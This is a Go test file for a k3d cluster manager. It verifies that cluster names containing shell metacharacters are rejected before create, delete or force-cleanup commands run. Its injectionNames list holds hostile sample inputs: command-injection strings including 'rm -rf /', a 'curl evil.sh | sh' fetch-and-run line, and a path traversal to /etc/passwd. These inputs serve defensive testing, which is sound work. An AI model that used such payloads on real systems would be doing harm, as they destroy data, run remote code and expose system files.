package k3d

import (
	"context"
	"testing"

	"github.com/flamingo-stack/openframe-cli/internal/cluster/models"
	"github.com/flamingo-stack/openframe-cli/internal/shared/executor"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// injectionNames are cluster names carrying shell metacharacters. The
// force-delete fallback is the one place a cluster name reaches a shell, so any
// of these must be rejected before a command runs.
var injectionNames = []string{
	`dev'; whoami; '`,
	`dev$(id)`,
	"dev`id`",
	"dev; rm -rf /",
	"dev && curl evil.sh | sh",
	"dev\nwhoami",
	"dev|whoami",
	"../../etc/passwd",
	"",
	"   ",
}

// TestDeleteCluster_RejectsShellMetacharacters is the injection guard:
// `cluster delete <name> --force` skips the existence check and the command
// layer never validated the name on this path, so validation must happen at
// the provider boundary — before any command is issued.
func TestDeleteCluster_RejectsShellMetacharacters(t *testing.T) {
	for _, name := range injectionNames {
		t.Run(name, func(t *testing.T) {
			mock := executor.NewMockCommandExecutor()
			m := NewK3dManager(mock, false)

			for _, force := range []bool{false, true} {
				err := m.DeleteCluster(context.Background(), name, models.ClusterTypeK3d, force)
				require.Errorf(t, err, "name %q must be rejected (force=%v)", name, force)
			}
			assert.Zerof(t, mock.GetCommandCount(),
				"no command may run for the invalid name %q — it reaches a `bash -c` string on the WSL path", name)
		})
	}
}

// TestForceCleanup_RejectsShellMetacharacters guards the sink itself, so a
// future caller that skips DeleteCluster cannot reintroduce the injection.
func TestForceCleanup_RejectsShellMetacharacters(t *testing.T) {
	for _, name := range injectionNames {
		mock := executor.NewMockCommandExecutor()
		m := NewK3dManager(mock, false)

		err := m.forceCleanupDockerContainers(context.Background(), name)
		require.Errorf(t, err, "cleanup must reject %q", name)
		assert.Zerof(t, mock.GetCommandCount(), "no shell command may run for %q", name)
	}
}

// TestCreateCluster_RejectsShellMetacharacters mirrors the DeleteCluster
// guard: the name is interpolated into the generated k3d YAML config, so it
// must be rejected before any command runs or any file is written.
func TestCreateCluster_RejectsShellMetacharacters(t *testing.T) {
	for _, name := range injectionNames {
		t.Run(name, func(t *testing.T) {
			mock := executor.NewMockCommandExecutor()
			m := NewK3dManager(mock, false)

			_, err := m.CreateCluster(context.Background(), models.ClusterConfig{
				Name:      name,
				Type:      models.ClusterTypeK3d,
				NodeCount: 1,
			})
			require.Errorf(t, err, "name %q must be rejected", name)
			assert.Zerof(t, mock.GetCommandCount(),
				"no command may run for the invalid name %q — it is interpolated into the k3d config YAML", name)
		})
	}
}

// TestDeleteCluster_AcceptsValidNames: the guard must not break real names.
func TestDeleteCluster_AcceptsValidNames(t *testing.T) {
	for _, name := range []string{"dev", "openframe-test", "a", "cluster-123", "Dev-2"} {
		mock := executor.NewMockCommandExecutor()
		m := NewK3dManager(mock, false)

		require.NoErrorf(t, m.DeleteCluster(context.Background(), name, models.ClusterTypeK3d, false),
			"valid name %q must be accepted", name)
		assert.NotZerof(t, mock.GetCommandCount(), "a valid name must reach k3d: %q", name)
	}
}
